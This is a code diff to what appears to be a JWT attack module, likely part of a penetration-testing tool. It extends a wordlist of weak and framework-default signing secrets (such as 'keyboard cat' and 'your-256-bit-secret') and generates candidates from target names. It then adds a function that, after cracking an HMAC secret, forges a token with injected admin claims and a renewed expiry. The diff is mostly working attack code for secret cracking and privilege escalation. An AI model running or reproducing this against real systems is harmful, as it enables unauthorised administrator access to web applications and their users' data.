@@ -228,6 +228,18 @@ _COMMON_SECRETS = [
     "key", "private", "default", "token_secret", "hs256-secret",
     "supersecret", "jwt-secret", "auth-secret", "s3cr3t", "jwt",
     "hmac-secret", "signing-key", "app-secret", "api-secret",
+    # Additional common secrets
+    "SECRET_KEY", "JWT_SECRET", "JWT_SECRET_KEY", "APP_SECRET",
+    "SECRET", "SIGNING_KEY", "TOKEN_SECRET", "AUTH_SECRET",
+    "secret_key", "jwt_key", "api_key", "app_key",
+    "secretkey", "jwtsecret", "tokenkey", "authsecret",
+    "mysecret", "mykey", "mypassword", "abc123", "qwerty",
+    "letmein", "welcome", "monkey", "dragon", "master",
+    "12345678", "123456789", "1234567890", "pass", "pass123",
+    "password123", "Password1", "P@ssw0rd", "p@ssword",
+    # Framework defaults
+    "django-insecure-key", "change-me", "your-secret-key",
+    "your-256-bit-secret", "shhhhh", "keyboard cat",
 ]
 
 
@@ -244,6 +256,7 @@ def _generate_target_secrets(target_url: str) -> list[str]:
         names = []
 
     years = ["2024", "2025", "2026"]
+    numbers = ["1", "123", "1234"]
     for name in names:
         secrets.append(name)
         secrets.append(f"{name}_secret")
@@ -251,11 +264,45 @@ def _generate_target_secrets(target_url: str) -> list[str]:
         secrets.append(f"{name}_key")
         secrets.append(f"{name}_prod")
         secrets.append(f"{name}_dev")
+        secrets.append(f"{name}_api")
+        secrets.append(f"{name}_SECRET_KEY")
+        secrets.append(f"{name}_JWT_SECRET")
+        secrets.append(name.upper())
+        secrets.append(f"{name.upper()}_SECRET")
         for year in years:
             secrets.append(f"{name}_{year}")
             secrets.append(f"{name}_secret_{year}")
+        for num in numbers:
+            secrets.append(f"{name}{num}")
+            secrets.append(f"{name}_secret{num}")
 
     return secrets
+
+
+def _forge_admin_token(
+    header: dict, payload: dict, secret: str, hash_name: str,
+) -> str | None:
+    """Forge a JWT with admin claims using a cracked secret."""
+    try:
+        admin_payload = dict(payload)
+        # Inject admin claims
+        admin_payload["role"] = "admin"
+        admin_payload["is_admin"] = True
+        admin_payload["admin"] = True
+        # Extend expiry by 24 hours
+        if "exp" in admin_payload:
+            admin_payload["exp"] = int(time.time()) + 86400
+        if "iat" in admin_payload:
+            admin_payload["iat"] = int(time.time())
+
+        h_enc = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+        p_enc = _b64url_encode(json.dumps(admin_payload, separators=(",", ":")).encode())
+        signing_input = f"{h_enc}.{p_enc}".encode()
+        sig = hmac.new(secret.encode(), signing_input, hash_name).digest()
+        sig_enc = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
+        return f"{h_enc}.{p_enc}.{sig_enc}"
+    except Exception:
+        return None
 
 
 def _brute_force_secret(token: str, target_url: str) -> dict[str, Any]:
@@ -264,7 +311,7 @@ def _brute_force_secret(token: str, target_url: str) -> dict[str, Any]:
     if len(parts) != 3:
         return {"cracked": False}
 
-    header, _, _ = _decode_jwt(token)
+    header, payload, _ = _decode_jwt(token)
     alg = header.get("alg", "HS256").upper()
 
     # Map algorithm to hashlib name
@@ -296,7 +343,14 @@ def _brute_force_secret(token: str, target_url: str) -> dict[str, Any]:
             ).digest()
             computed_sig = base64.urlsafe_b64encode(computed).rstrip(b"=").decode()
             if computed_sig == actual_sig:
-                return {"cracked": True, "secret": candidate, "algorithm": alg}
+                result: dict[str, Any] = {
+                    "cracked": True, "secret": candidate, "algorithm": alg,
+                }
+                # Forge admin token
+                forged = _forge_admin_token(header, payload, candidate, hash_name)
+                if forged:
+                    result["forged_admin_token"] = forged
+                return result
         except Exception:
             continue
 
